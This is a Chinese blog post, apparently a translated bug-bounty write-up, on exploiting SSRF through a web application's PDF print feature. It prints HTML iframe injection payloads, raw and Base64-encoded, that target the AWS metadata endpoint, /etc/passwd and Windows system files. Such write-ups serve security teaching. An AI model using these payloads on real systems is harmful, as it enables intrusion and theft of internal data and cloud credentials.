#  通过 PDF 打印功能利用SSRF访问内部数据   
原创 骨哥说事  骨哥说事   2024-11-26 01:10  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
# 文章原文：https://gugesay.com/archives/3634  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
# 前言  
  
服务器端请求伪造 (SSRF) 是一种 Web 安全漏洞，当攻击者操纵服务器向非预期目标发出未经授权的 HTTP 或其他基于协议的请求时，就会发生此类漏洞。  
# 在应用中寻找SSRF  
  
比如某个应用程序使用了不同的内部域来处理财务数据，并通过 iframe 获取数据。  
  
在深入探索该应用程序时，发现了一处打印功能。  
  
此功能将页面转换为 HTML，以 Base64 对其进行编码，然后发送以等待打印。  
  
这不禁让人想起了NahamSec 和其它安全研究人员的文章和视频中的 SSRF 技术，特别是围绕 PDF 转换功能，这些功能通常存在 SSRF 风险。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvU4U5Y6XbqWL21VZHpiaV6rIxUbzibiarNPlQOP6iaByIoxNTphPibOm4Mb2g/640?wx_fmt=png&from=appmsg "")  
  
首先尝试使用一些常用的Payloads来检查 SSRF，比如使用针对 AWS 元数据端点和 Linux 文件路径的命令：  
```
"><iframe src="http://169.254.169.254/latest/meta-data" height=2500 width=500> "><iframe src="cat /etc/passwd" height=2500 width=500>
```  
  
但是遇到了 iframe 中高度和宽度参数的问题，这会导致输出失真。经过一番尝试，白帽小哥最终找到了这些参数的正确结构。  
  
但是遇到了 iframe 中高度和宽度参数的问题，这会导致输出失真。经过一番尝试，白帽小哥最终找到了这些参数的正确结构。  
```
"><iframe src="C:\Windows\debug\NetSetup.LOG" height=2500 width=500>
 "><iframe/src="C:/Windows/win.ini">
```  
```
Ij48aWZyYW1lL3NyYz0iQzpcV2luZG93c1xkZWJ1Z1xOZXRTZXR1cC5MT0ciIGhlaWdodD0yNTAwIHdpZHRoPTUwMD4=
Ij48aWZyYW1lL3NyYz0iQzpcV2luZG93c1xkZWJ1Z1xOZXRTZXR1cC5MT0ciIGhlaWdodD01MDAgd2lkdGg9NzAwPg==
```  
  
发送请求如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvUWV9gpCjXHULIxuQqjGet9N4XfwkzAiajibmdSQ1ZIFIcWvP4ic0qcCxFg/640?wx_fmt=png&from=appmsg "")  
  
成功收获SSRF漏洞：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvUsLRuafZDIwJepOw7FCAtibHZT7t9AcbrZ0yKjwYTS6TuOjEKYccSibWg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jl1uOxOnccqkiaCsDJlV6gvU1dChmBFK3Lr879XXjDSjtlfBiaXkZleYucLtV57liaEK6x5B8AIQ58Jg/640?wx_fmt=png&from=appmsg "")  
  
你学到了么？  
  
原文：  
https://bishal0x01.medium.com/ssrf-to-internal-data-access-via-pdf-print-feature-b8e6a912844a  
  
**加入星球，随时交流：**  
  
****  
**（前50位成员）：99元/年************（后续会员统一定价）：128元/年******  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～****====正文结束====**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jlicLtK13eXeeOdNTf1LuS6uB1tacyguiaLR3etIX6yKXygXa2buibwTKPWabTgd3mIcERRSorQ2DSbg/640?wx_fmt=jpeg&from=appmsg "")  
  
